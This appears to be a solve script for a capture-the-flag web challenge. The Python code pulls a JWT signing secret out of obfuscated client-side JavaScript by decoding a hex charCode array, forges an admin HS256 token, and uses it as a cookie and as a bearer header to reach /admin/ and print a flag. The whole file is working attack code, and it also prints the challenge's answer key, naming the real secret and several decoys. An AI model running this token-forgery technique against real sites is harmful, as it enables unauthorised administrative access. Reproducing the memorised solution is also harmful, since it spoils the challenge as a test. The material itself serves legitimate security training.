#!/usr/bin/env python3
"""
WEB-03 Solve Script: JWT Secret Leak (Obfuscated)
1. Extract JWT signing secret from obfuscated auth.min.js
2. Forge admin JWT token
3. Access /admin/ to retrieve flag
"""

import requests
import json
import base64
import hmac
import hashlib
import re
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8003"

print(f"[*] Target: {TARGET}")

# ── Step 1: Find JWT secret in obfuscated JavaScript ──
print("\n[*] Step 1: Fetching auth.min.js to find JWT secret...")
print("[*] Note: Secret is obfuscated as a hex charCode array, not plain text")

r = requests.get(f"{TARGET}/js/auth.min.js", timeout=5)
if r.status_code != 200:
    print(f"[-] Could not fetch auth.min.js: {r.status_code}")
    sys.exit(1)

# The secret is stored as a hex charCode array: [0x73,0x33,0x63,0x72,...]
# Pattern: array of hex values decoded via String.fromCharCode
hex_array_match = re.search(r'_0x8d1a=\[((?:0x[0-9a-f]+,?)+)\]', r.text)
if hex_array_match:
    hex_values = re.findall(r'0x([0-9a-f]+)', hex_array_match.group(1))
    jwt_secret = ''.join(chr(int(h, 16)) for h in hex_values)
    print(f"[+] JWT secret extracted from hex charCode array: {jwt_secret}")
else:
    # Fallback: try to find any hex array that could be the secret
    all_hex_arrays = re.findall(r'\[((?:0x[0-9a-f]{2},?){10,})\]', r.text)
    jwt_secret = None
    for arr_str in all_hex_arrays:
        hex_vals = re.findall(r'0x([0-9a-f]+)', arr_str)
        decoded = ''.join(chr(int(h, 16)) for h in hex_vals)
        # Filter out obvious non-secrets (pure ASCII printable, reasonable length)
        if 10 <= len(decoded) <= 50 and all(32 <= ord(c) <= 126 for c in decoded):
            print(f"[+] Potential secret from hex array: {decoded}")
            if jwt_secret is None:
                jwt_secret = decoded

    if not jwt_secret:
        print("[-] Could not extract secret. Trying known default...")
        jwt_secret = "s3cr3t_k3y_d0nt_l34k"

print(f"\n[*] IMPORTANT: Ignore decoy secrets in analytics.min.js and config.bundle.js!")
print(f"[*] Decoy 1: analytics.min.js → 'f4k3_4n4lyt1cs_k3y_x7m9' (FAKE)")
print(f"[*] Decoy 2: config.bundle.js → 'pr0d_s1gn1ng_k3y_2024_v4' (FAKE)")
print(f"[*] Decoy 3: config.bundle.js → hex array for 'corp_api_k3y_pr0d' (FAKE)")
print(f"[+] Real secret: {jwt_secret}")

# Also extract algorithm from the string array
algorithm = "HS256"  # Default, also found in the obfuscated string array
print(f"[+] Algorithm: {algorithm}")

# ── Step 2: Forge admin JWT ──
print("\n[*] Step 2: Forging admin JWT token...")

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = base64url_encode(json.dumps({
    "sub": "admin",
    "role": "admin",
    "iss": "corpportal",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}).encode())

signature_input = f"{header}.{payload}"
signature = base64url_encode(
    hmac.new(jwt_secret.encode(), signature_input.encode(), hashlib.sha256).digest()
)

forged_token = f"{header}.{payload}.{signature}"
print(f"[+] Forged JWT: {forged_token[:50]}...")

# ── Step 3: Access admin panel ──
print("\n[*] Step 3: Accessing /admin/ with forged token...")

# Try via cookie
cookies = {"auth_token": forged_token}
r = requests.get(f"{TARGET}/admin/", cookies=cookies, timeout=5)

if r.status_code == 200 and "FLAG{" in r.text:
    data = r.json()
    print(f"\n[+] Admin panel accessed!")
    print(f"[+] FLAG CAPTURED: {data.get('flag', 'found in response')}")
    sys.exit(0)

# Try via Authorization header
headers = {"Authorization": f"Bearer {forged_token}"}
r = requests.get(f"{TARGET}/admin/", headers=headers, timeout=5)

if r.status_code == 200 and "FLAG{" in r.text:
    data = r.json()
    print(f"\n[+] Admin panel accessed!")
    print(f"[+] FLAG CAPTURED: {data.get('flag', 'found in response')}")
    sys.exit(0)

# Try index.php in admin
r = requests.get(f"{TARGET}/admin/index.php", cookies=cookies, timeout=5)
if "FLAG{" in r.text:
    flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
    if flag_match:
        print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
        sys.exit(0)

print(f"\n[-] Could not access admin panel. Response: {r.text[:300]}")
print("    Try manually: set auth_token cookie with forged JWT")
